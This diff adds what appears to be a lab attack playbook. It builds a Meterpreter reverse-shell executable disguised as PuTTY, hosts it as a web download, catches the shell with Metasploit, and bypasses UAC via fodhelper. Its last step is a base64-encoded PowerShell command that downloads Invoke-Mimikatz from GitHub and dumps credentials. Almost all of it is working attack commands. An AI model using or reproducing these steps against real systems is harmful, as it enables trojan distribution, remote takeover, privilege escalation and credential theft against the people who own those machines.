@@ -1,0 +1,51 @@
+###########
+1: Create Payload on kali
+###########
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.11.5.100 LPORT=8081 -f exe > malicious_putty.exe
+
+###########
+2: create a simple webpage to host malicious_putty.exe
+###########
+change /var/www/html/index.html 
+move malicious_putty.exe to /var/www/html/software
+link a download on index.html to software/malicious_putty.exe
+
+###########
+3: prepare reverse shell
+###########
+Create text file (1-reverse_shell.txt)
+use multi/handler
+set payload windows/meterpreter/reverse_tcp
+set LHOST 10.11.5.100
+set LPORT 8081
+set ExitOnSession false
+run
+
+###########
+4: run msfconsole
+###########
+-- resource 1-reverse_shell.txt
+
+###########
+5: run maliciousputty.exe on victim pc
+###########
+
+###########
+6: bypass UAC
+###########
+Create text file (2-bypassuac.txt)
+use exploit/windows/local/bypassuac_fodhelper
+set SESSION 1
+set TARGET 1
+set payload windows/x64/meterpreter/reverse_https
+set LHOST 192.168.230.137
+set LPORT 8081
+run
+
+###########
+7: run PS script
+###########
+create text file (3-mimikatz.txt)
+session 2
+load powershell
+powershell_execute -encodedCommand cABvAHcAZQByAHMAaABlAGwAbAAuAGUAeABlACAAIgBJAEUAWAAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAKQAuAEQAbwB3AG4AbABvAGEAZABTAHQAcgBpAG4AZwAoACcAaAB0AHQAcABzADoALwAvAHIAYQB3AC4AZwBpAHQAaAB1AGIAdQBzAGUAcgBjAG8AbgB0AGUAbgB0AC4AYwBvAG0ALwBQAG8AdwBlAHIAUwBoAGUAbABsAE0AYQBmAGkAYQAvAFAAbwB3AGUAcgBTAHAAbABvAGkAdAAvAG0AYQBzAHQAZQByAC8ARQB4AGYAaQBsAHQAcgBhAHQAaQBvAG4ALwBJAG4AdgBvAGsAZQAtAE0AaQBtAGkAawBhAHQAegAuAHAAcwAxACcAKQA7ACAASQBuAHYAbwBrAGUALQBNAGkAbQBpAGsAYQB0AHoAIAAtAEQAdQBtAHAAQwByAGUAZABzACIA
